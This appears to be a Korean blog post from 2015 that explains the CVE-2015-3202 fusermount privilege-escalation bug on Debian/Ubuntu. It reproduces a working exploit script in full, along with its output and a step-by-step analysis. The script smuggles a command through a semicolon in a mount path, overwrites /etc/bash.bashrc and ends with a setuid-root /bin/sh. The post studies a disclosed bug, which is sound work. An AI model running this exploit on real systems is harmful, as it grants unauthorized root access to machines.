---
layout: post
title: "CVE-2015-3202: fusermount"
date: 2015-05-22 23:07:55 +0900
comments: true
categories: 
---

Tavis Ormandy 가 데비안/우분투에서 root 를 얻는 버그를 공개했다.

[gist](https://gist.github.com/taviso/ecb70eb12d461dd85cba)

Twitter 에 올릴라고 140 자로 압축한 exploit 을 풀어봤다.

```
z@ubuntu:~$ cat babo.sh
echo "chmod 4755 /bin/sh" > /tmp/babo
chmod 755 /tmp/babo
mkdir -p /tmp/babo\;/tmp/babo
LIBMOUNT_MTAB=/etc/bash.bashrc _FUSE_COMMFD=0 fusermount /tmp/babo\;/tmp/babo
```

이 간단한 스크립트를 실행해본다.

```
z@ubuntu:~$ ./babo.sh
fusermount: failed to open /etc/fuse.conf: Permission denied
sending file descriptor: Socket operation on non-socket
z@ubuntu:~$ cat /etc/bash.bashrc
/dev/fuse /tmp/.6960;/tmp/.6960 fuse rw,nosuid,nodev,user=z 0 0
```

이제 관리자가 sudo 나 root login 하기를 기다린다.

```
z@ubuntu:~$ sudo -s
bash: /dev/fuse: Permission denied
root@ubuntu:~# exit
exit
z@ubuntu:~$ ls -lL /bin/sh
-rwsr-xr-x 1 root root 121272 Feb 10    2014 /bin/sh
z@ubuntu:~$
```

저 스크립트를 돌리면

1. fusermount 가 바보같이 /etc/bash.bashrc 에다가 마운트 테이블을 overwrite 하는데, 
2. 나중에 root 가 로그인할때 /etc/bash.bashrc 가 수행되면서, (sudo -s)
3. /tmp/.6960 이 수행되고
4. chmod 4755 /bin/sh 이 수행되면서
5. setuid 쉘이 만들어지는 결과

가 나오는 것으로 보인다.

핵심은 1 번 버그인 것 같은데,

1. fusermount 가 setuid 되어있다.
2. fusermount 가 /bin/mount 를 부를때 (setuid(geteuid()) 를 해서 ruid 를 0 를 만든다)
3. mount 는 root 가 불렀다고 착각한다. (fusermount 입장에서는 의도된 것이긴 하지만, mount 입장에서는 속은 것)
4. 이제 mount 디버깅용 환경 변수가 먹힌다. (LIBMOUNT_MTAB)
5. 이제 마운트 테이블로 어떤 화일이든 overwrite 할 수 있다.

sudo 쳐주기를 기다려야한다는 점에서, 실전에서 유용성은 많이 떨어진다고 본다.
